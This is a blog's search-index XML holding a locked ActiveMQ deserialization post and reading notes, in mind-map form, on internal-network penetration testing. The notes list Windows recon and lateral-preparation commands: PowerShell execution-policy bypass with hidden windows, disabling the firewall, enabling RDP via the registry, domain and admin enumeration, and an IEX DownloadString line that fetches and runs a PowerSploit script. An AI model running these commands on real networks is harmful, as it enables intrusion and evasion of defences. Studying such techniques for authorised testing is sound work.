<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>（CVE-2015-5254）ActiveMQ 反序列化漏洞</title>
    <url>/2021/01/12/(CVE-2015-5254)ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>Poc</category>
      </categories>
      <tags>
        <tag>ApacheMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全攻防-渗透测试指南</title>
    <url>/2021/01/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<map>
  <node ID="root" TEXT="内网安全攻防-渗透测试指南 读书笔记">
    <node TEXT="一、内网渗透测试基础" ID="39c1735a6a3092018" STYLE="bubble" POSITION="right">
      <node TEXT="Powershell" ID="2051735a6b769d11a" STYLE="fork">
      <a id="more"></a>
        <node TEXT="查看执行策略 Get-ExecutionPolicy" ID="1b1735a6d14ed11a" STYLE="fork"/>
        <node TEXT="设置执行策略 Set-ExecutionPolicy [options]" ID="1af1735a7c9bf8043" STYLE="fork">
          <node TEXT="Restricted 脚本不能执行【默认设置】" ID="2fc1735a7cf92f146" STYLE="fork"/>
          <node TEXT="RemoteSigned 本地脚本可以运行，远程脚本不能运行" ID="1211735a7d325014d" STYLE="fork"/>
          <node TEXT="AllSigned 受信任的签名脚本才能运行" ID="15f1735a7dbdcd029" STYLE="fork"/>
          <node TEXT="Unrestricted 允许所有脚本运" ID="30c1735a7e1e5505a" STYLE="fork"/>
        </node>

<pre><code>    &lt;node TEXT=&quot;运行脚本  .\test.ps1&quot; ID=&quot;17e1735a7e9f95176&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;powershell.exe -ExecutionPolicy bypass -File powerup.ps1&quot; ID=&quot;1811735a7fee8d00b&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;powershell.exe -exec bypass -command &amp;quot;&amp;amp; &#123;Import-Module c:\powerup.ps1;Invoke-AllChecks&#125;&amp;quot;&quot; ID=&quot;381735a80b1650ab&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;一些常用参数&quot; ID=&quot;3db1735a83baf509b&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;-ExecutionPolicy bypass 绕过执行安全策略&quot; ID=&quot;3161735a83d685143&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;-W hidden 隐藏窗口&quot; ID=&quot;691735a84512d0c6&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;-NonI 不提供交互式的提示&quot; ID=&quot;29c1735a84784d01c&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;-NoP 不加载当前 用户的配置文件&quot; ID=&quot;cf1735a84ba25094&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;-noexit 执行后不退出shell&quot; ID=&quot;2291735a84f32d132&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;-nologo 不显示powershell 版权信息&quot; ID=&quot;3c61735a852c0d0cb&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;-enc xxxxxx  加载base64编码后的脚本内容&quot; ID=&quot;19b1735a85dabd0c6&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;32位与64位&quot; ID=&quot;bd1735a86b78d0c2&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;32位： powershell.exe -Nop -NonI -W hidden -exec bypass&quot; ID=&quot;2ee1735a86d07d0e8&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;64位：%windir%\syswow64\windowspowershell\v1.0\powershell.exe -Nop -NonI -W hidden -exec bypass&quot; ID=&quot;b71735a87291d09d&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
&lt;/node&gt;
&lt;node TEXT=&quot;二、内网信息收集&quot; ID=&quot;3141735a6a63ec0e7&quot; STYLE=&quot;bubble&quot; POSITION=&quot;right&quot;&gt;
  &lt;node TEXT=&quot;手动信息收集&quot; ID=&quot;2281735a8879940a2&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;查询网络配置信息：ipconfig /all&quot; ID=&quot;1191735a88917315d&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查询操作系统及软件信息&quot; ID=&quot;541735a89e1a5098&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;查询操作系统版本&quot; ID=&quot;21c1735a8a6b5d191&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;systeminfo|findstr /B /C:&amp;quot;OS Name&amp;quot; /C:&amp;quot;OS Version&amp;quot; [英文版]&quot; ID=&quot;2fb1735a88af140b5&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;systeminfo|findstr /B /C:&amp;quot;OS 名称&amp;quot; /C:&amp;quot;OS 版本&amp;quot; [中文版]&quot; ID=&quot;ac1735a8a0fce18&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;查看系统体系结构&quot; ID=&quot;3071735a8a925d086&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;echo %PROCESSOR_ARCHITECTURE%&quot; ID=&quot;701735a8ab885093&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;查看安装 的软件&quot; ID=&quot;1b81735a8b11dc0da&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;wmic product get name,version&quot; ID=&quot;861735a8b3cfd0fe&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;powershell &amp;quot;get-wmiobject -class Win32_product | select-Object -property name,version&amp;quot;&quot; ID=&quot;1bc1735a8b697407e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查询本机服务信息：wmic service list brief&quot; ID=&quot;30a1735a8bf5d5184&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查询进程列表&quot; ID=&quot;29d1735a8c7c540cd&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;tasklist&quot; ID=&quot;1061735a8cace5173&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;wmic process list brief&quot; ID=&quot;2891735a8cbc8411e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查询启动信息：wmic startup get command,caption&quot; ID=&quot;1c1735a93ceed12a&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查询计划任务：schtasks /query /fo LIST /v&quot; ID=&quot;26b1735a9447a5025&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查看主机开机时间：net statistics workstation&quot; ID=&quot;551735a94f90d12e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;连接的会话：net session&quot; ID=&quot;3f1735a970ccd0ac&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查询补丁&quot; ID=&quot;11a1735a98287416d&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;systeminfo&quot; ID=&quot;1ce1735a98417d052&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;wmic qfe get caption,description,hotfixid,installedon&quot; ID=&quot;1041735a984b9d16e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查询共享&quot; ID=&quot;2ec1735a9a0cbd122&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;net share&quot; ID=&quot;2cb1735a9a1c35131&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;wmic share get name,path,status&quot; ID=&quot;39c1735a9a273c052&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;防火墙操作&quot; ID=&quot;2c91735a9b6554071&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;查看防火墙状态：netsh firewall show config&quot; ID=&quot;2a91735a9b7c76021&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;关闭防火墙&quot; ID=&quot;911735a9bc89c08e&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;netsh firewall set opmode disable [server 2003]&quot; ID=&quot;2571735a9be20c02b&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;netsh advfirewall set allprofiles state off [server 2003之后]&quot; ID=&quot;dc1735a9c1e5416a&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查看代理设置&quot; ID=&quot;3d1735a9cd21e15d&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;reg query &amp;quot;HKEY_CURRENT_USE6R\Software\Microsoft\windows\currentVersion\Internet Settings&amp;quot;&quot; ID=&quot;941735a9cf1b50c8&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;远程连接服务&quot; ID=&quot;3291735a9e60ec048&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;查看远程连接端口&quot; ID=&quot;1571735a9e7d2511&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;reg query &amp;quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&amp;quot; /V portNumber [需要将16进制数字进行转换]&quot; ID=&quot;1541735a9ea7ad063&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;tasklist /svc |findstr TermService 记住pid号 再执行netstat -ano|findstr [pid]&quot; ID=&quot;3af1735aa065f8142&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;开户远程连接端口&quot; ID=&quot;19d1735aa2ef3d14d&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;server 2003 &amp;amp; XP&quot; ID=&quot;18f1735aa44a5f142&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;wmic path win32_terminalservicesetting where (__CLASS != &amp;quot;&amp;quot;) call setallowtsconnections 1 &quot; ID=&quot;2ae1735aa308a5178&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;quot; &amp;quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot; ID=&quot;1da1735aa46d8d093&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;server2008/7/2012&quot; ID=&quot;3b01735aa3f2be161&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&amp;quot;&amp;quot;) call  set allowtsconnections 1&quot; ID=&quot;2141735aa4a36d02d&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&amp;apos;RDP-Tcp&amp;apos;) call setuserauthenticationrequired 1&quot; ID=&quot;eb1735aa4d695142&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;reg add &amp;quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f&quot; ID=&quot;3181735aa52df205&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;7和2012只需要前两条即可&quot; ID=&quot;1941735aa55122055&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;自动信息收集&quot; ID=&quot;2511735aa57ae1085&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;wmic_info.bat [下载地址：http://www.fuzzysecurity.com/scripts/files/wmic_info.rar]&quot; ID=&quot;2ba1735aa58d6a09e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;Empire下的信息收集&quot; ID=&quot;33f1735aa92b5e014&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;usemodule situational_awareness/host/winenum&quot; ID=&quot;39d1735aa94145054&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;查看当前权限&quot; ID=&quot;b31735aaa5d1408f&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;查看当前权限 ：whoami&quot; ID=&quot;ec1735aaa71cc006&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;获取域SID：whoami /all&quot; ID=&quot;1f41735aab5514193&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查询指定用户的详细信息：net user xxx /domain&quot; ID=&quot;3b81735aab8ddd0fd&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;判断是否存在域&quot; ID=&quot;2531735aabd2bd01f&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;ipconfig /all [看主DNS 后缀]&quot; ID=&quot;2a71735aabf92512e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;systeminfo [看 域 ，如果为workgroup即不在域环境]&quot; ID=&quot;17c1735aaccc6d0e6&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;net config workstation[看 域 ，如果为workgroup即不在域环境]&quot; ID=&quot;291735aade1cd153&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;判断主域：net time /domain&quot; ID=&quot;3ba1735aae604e18b&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;拒绝访问：存在域，但当前用户不是域用户&quot; ID=&quot;1911735aaec11e016&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;回显时间：存在域，且当前用户为域用户&quot; ID=&quot;2e71735aaf39b5061&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;找不到workgroup的域控制器：不存在域&quot; ID=&quot;2d01735aaf8b3d07c&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;探测域内存活主机&quot; ID=&quot;691735aafc2550f&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;利用NetBIOS快速探测&quot; ID=&quot;1121735ab1703d0cb&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;nbtscan 192.168.1.1/20 [下载地址：http://www.unixwiz.net/tools/nbtscan.html#download]&quot; ID=&quot;1d1735ab1f8dd0e2&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;sharing :正在运行文件和打印共享服务，不一定有内容共享&quot; ID=&quot;2131735ab3cc4d087&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;dc: 可能是域控制器&quot; ID=&quot;1871735ab42ce50be&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;u=user : 有登陆名为User的用户&quot; ID=&quot;c01735ab4553c127&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;IIS: 可能安装了IIS服务&quot; ID=&quot;1d21735ab490f505c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;exchange: 可能安装了exchange&quot; ID=&quot;591735ab4c11d14e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;notes : 可能安装了lotus notes 邮件客户端&quot; ID=&quot;1d61735ab50035073&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;? : 未识别出该机器 的NetBios资源&quot; ID=&quot;3591735ab5441514&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;利用ICMP协议探测&quot; ID=&quot;2d21735ab591440d4&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;循环ping: for /L %I in (1,1, 254) do @ping -w 1 -n 1 192.168.1.%I | findstr &amp;quot;TTL=&amp;quot;&quot; ID=&quot;e41735ab5b914183&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;VBS脚本&quot; ID=&quot;1ec1735aba49dd016&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;通过ARP扫描探测&quot; ID=&quot;1531735ac98f1611a&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;apr-scan工具：arp.exe -t 192.168.1.1/24 [下载地址：https://gitee.com/RichChigga/arp-scan-windows]&quot; ID=&quot;24f1735ac9ab7d056&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Empire中的arpscan模块：usemodule situational_awareness/network/arpscan&quot; ID=&quot;3b1735aced82e097&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;Nishang中的Invoke-ARPScan.ps1脚本&quot; ID=&quot;32a1735acf5fd5087&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;powershell.exe -exec bypass -Command &amp;quot;&amp;amp; &#123;Import-Module c:\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.1/24&#125;&amp;quot; &amp;gt;&amp;gt; c:\log.txt&quot; ID=&quot;24d1735ad138ed005&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;通过常规TCP/UDP端口扫描&quot; ID=&quot;24e1735ad23dbd144&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;scanline工具&quot; ID=&quot;3a11735ad2705d0f5&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;scanline -h -t 20,80-89,110,389,445,3389,1099,7001,3306,1433,8080,1521 -u 53,161 -O c:\log.txt -p 192.168.1.1-254 /b&quot; ID=&quot;2a71735ad7fad50c9&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;扫描域内端口&quot; ID=&quot;2c91735adaeac5179&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;利用telnet命令扫描&quot; ID=&quot;3751735adb0ead146&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;telnet DC 1433&quot; ID=&quot;11a1735adb368d173&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;s扫描器&quot; ID=&quot;1e71735adb7545191&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;s.exe tcp 192.168.1.1 192.168.1.254 445,1433,3389,7001 256 /Banner /save&quot; ID=&quot;1161735adb966d08e&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Metasploit端口扫描&quot; ID=&quot;18b1735adc464406a&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;use auxiliary/scanner/portscan/tcp&quot; ID=&quot;ae1735adcdd3e0cd&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;PowerSploit的Invoke-portscan.ps1脚本&quot; ID=&quot;3131735add2afd08d&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;powershell.exe -nop -exec bypass -c &amp;quot;IEX (New-Object Net.WebClient).DownloadString(&amp;apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&amp;apos;);Invoke-Portscan -Host 192.168.1.1/24 -T4 -ports &amp;apos;445,3389,1433,8080,7001&amp;apos; -oA c:\log.txt&amp;quot;&quot; ID=&quot;35e1735add7f84049&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;Nishang的Invoke-PortScan模块&quot; ID=&quot;2041735ae02b3613d&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.254 -ScanPort   [探测存活 -ResolveHost]&quot; ID=&quot;1381735ae05b5c0f7&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;收集域内基础信息&quot; ID=&quot;171735ae29fbf06f&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;查询域：net view /domain&quot; ID=&quot;2671735b65b8490f5&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查询 域内所有机器：net view /domain:domainName&quot; ID=&quot;1a91735b65f567164&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查询域内所有用户组：net group /domain&quot; ID=&quot;1841735b6688c90c6&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;域管理员：Domain Admins&quot; ID=&quot;3221735b678ac0005&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;域内机器 ：Domain Computers&quot; ID=&quot;1cd1735b67c08716&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;域控制器：Domain Controllers&quot; ID=&quot;37c1735b680398044&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;域访客： Domain Guest&quot; ID=&quot;2b31735b6845f805e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;域用户：Domain Users&quot; ID=&quot;611735b6872ae0e5&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;企业系统管理员用户：EnterpriseAdmins&quot; ID=&quot;2511735b68911615a&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查询所有域成员计算机列表：net group &amp;quot;domain computers&amp;quot; /domain&quot; ID=&quot;271735b68e370193&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;获取域信息信息： nltest /domain_trusts&quot; ID=&quot;1501735b69c2200fb&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;查找域控制器&quot; ID=&quot;2671735b6a8686127&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;查看域控制器的机器名：nltest /DCLIST:domainName&quot; ID=&quot;24b1735b6ab2af118&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查看域控制器的主机名：nslookup -type=SRV_ldap._tcp&quot; ID=&quot;17e1735b6b90a118a&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;node TEXT=&quot;查看域控制器组：net group &amp;quot;Domain Controllers&amp;quot; /domain&quot; ID=&quot;3ae1735b6c1d7f165&quot; STYLE=&quot;fork&quot;/&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;获取域内用户和管理员&quot; ID=&quot;34e1735b6d6a97163&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;查询所有域用户列表&quot; ID=&quot;1bd1735b6d8e9f002&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;向域控制器查询： net user /domain&quot; ID=&quot;2941735b6db1770e1&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;获取域内用户的详细信息： wmic useraccount get /all&quot; ID=&quot;1361735b6e8a7901d&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;查看存在的用户：dsquery user&quot; ID=&quot;2b61735b6ef857179&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
    &lt;node TEXT=&quot;查询域管理员用户级&quot; ID=&quot;2051735b724d2818&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;查询域管理员用户：net group &amp;quot;Domain admins&amp;quot; /domain&quot; ID=&quot;3b1735b72a79802e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;node TEXT=&quot;查询管理员用户组：net group &amp;quot;Enterprise Admins&amp;quot; /domain&quot; ID=&quot;1a11735b72f927109&quot; STYLE=&quot;fork&quot;/&gt;
    &lt;/node&gt;
  &lt;/node&gt;
  &lt;node TEXT=&quot;定位域管理员&quot; ID=&quot;4e1735b73613e0b9&quot; STYLE=&quot;fork&quot;&gt;
    &lt;node TEXT=&quot;常用域管理员定位 工具&quot; ID=&quot;3001735b7869e9108&quot; STYLE=&quot;fork&quot;&gt;
      &lt;node TEXT=&quot;psloggedon.exe [下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon]&quot; ID=&quot;2511735b7884a8105&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;可以查看本地登录的用户和通过本地计算机或远程计算机的资源登陆的用户。psloggedon /? 查看帮助文档&quot; ID=&quot;3121735b796660003&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;PVEFindADUser.exe [下载地址：https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn]&quot; ID=&quot;3291735b7ffcc705a&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;可用于查找 活动目录用户登陆的位置、枚举域用户、以及查找 在特定计算机上登陆的用户。&quot; ID=&quot;cc1735b8098df103&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;netview.exe[下载地址：https://github.com/mubix/netview ]&quot; ID=&quot;2fd1735b8348b1103&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;使用WinAPI枚举系统用户，利用NetSessionEnum寻找登陆会话，利用NetShareEnum寻找共享,利用NetWkstaUserEnum枚举登陆的用户&quot; ID=&quot;1a51735b83d4a801e&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;Nmap的NSE脚本&quot; ID=&quot;1091735b87ef9018&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;smb-enum-sessions.nse ：获取远程机器的登陆会话&quot; ID=&quot;3ce1735b881d9614e&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;smb-enum-domains.nse：对域控制器进行信息收集，获取主机信息、用户、可使用密码策略的用户&quot; ID=&quot;2151735b88c5ce0c4&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;smb-enum-users.nse：&quot; ID=&quot;2161735b89577819&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;smb-enum-shares.nse：遍历远程主机的共享目录&quot; ID=&quot;fa1735b89c1d9141&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;smb-enum-processes.nse：遍历主机的系统进程&quot; ID=&quot;20e1735b89e62718c&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;node TEXT=&quot;smb-os-discovery.nse：收集目标主机的操作系统、计算机名、域名、域林名称、NetBios机器名、NetBIOS域名、工作组、系统时间等&quot; ID=&quot;ad1735b8a4770046&quot; STYLE=&quot;fork&quot;/&gt;
      &lt;/node&gt;
      &lt;node TEXT=&quot;PowerView脚本&quot; ID=&quot;431735b8b609f1&quot; STYLE=&quot;fork&quot;&gt;
        &lt;node TEXT=&quot;Invoke-StealthUserHunter&quot; ID=&quot;1071735b8b77e00bd&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;只需要一次查询，就可以获取域里面的所有用户。PowerView默认使用Invoke-StealthUserHunter，如果找不到需要的信息，就使用Invoke-UserHunter&quot; ID=&quot;2841735b8c9c18089&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
        &lt;node TEXT=&quot;Invoke-UserHunter&quot; ID=&quot;3081735b8c54ef0df&quot; STYLE=&quot;fork&quot;&gt;
          &lt;node TEXT=&quot;找到域内特定的用户群，接收用户名、用户列表和域组查询 ，接收一个主机列表或查询 可用的主机域名&quot; ID=&quot;3c11735b8e3718008&quot; STYLE=&quot;fork&quot;/&gt;
          &lt;node TEXT=&quot;powershell.exe -exec bypass -Command &amp;quot;&amp;amp; &#123;Import-module C:\powerview.ps1;Invoke-UserHunter&#125;&amp;quot;&quot; ID=&quot;18b1735b8f325713&quot; STYLE=&quot;fork&quot;/&gt;
        &lt;/node&gt;
      &lt;/node&gt;
